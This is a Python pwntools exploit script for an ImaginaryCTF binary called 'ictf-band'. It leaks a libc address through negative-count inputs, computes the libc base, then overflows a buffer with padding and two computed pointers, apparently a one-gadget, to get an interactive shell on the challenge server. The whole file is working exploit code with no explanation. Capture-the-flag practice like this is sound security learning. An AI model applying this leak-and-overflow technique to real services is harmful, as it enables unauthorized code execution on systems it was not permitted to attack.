#!/usr/bin/env python3


from pwn import *


e = ELF("./ictf-band")
#r = process("./ictf-band")
r = remote("ictf-band.chal.imaginaryctf.org",1337)
libc = ELF("./libc.so.6")



def name(size,data):
        r.sendlineafter(b">>",b"1")
        r.sendlineafter(b"Slot [1-5]:",b"-1")
        r.sendlineafter(b"Album Count:",b"-1")
        r.sendlineafter(b"Would you like to buy one or maybe more? [y/n]:",b"y")
        r.sendlineafter(b"The album should be pre-ordered. Tell us how many you want, we will contact you soon:",f"{size}")
        r.sendafter(b"Tell us your e-mail:",data)

def exit_vuln(name,size,data):
    r.sendlineafter(b">>",b"4")
    r.sendlineafter(b"Name:",name)
    r.sendlineafter(b"Age:",f"{size}")
    r.sendafter(b"Life background:",data)

name(0x10,b"A" * 0x10)
r.recvuntil(b"A" * 16)
libc_base = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) - libc.sym._IO_2_1_stdout_
log.info("The libc base of the process is " + hex(libc_base))
r.sendlineafter(b"It's verified [y/n]:",b"y")
exit_vuln(b"Ajay",368,b"A" * 351 +  p64(libc_base + 0x21b8d0 + 0x78)+ p64(libc_base + 0xebc85))
r.interactive()
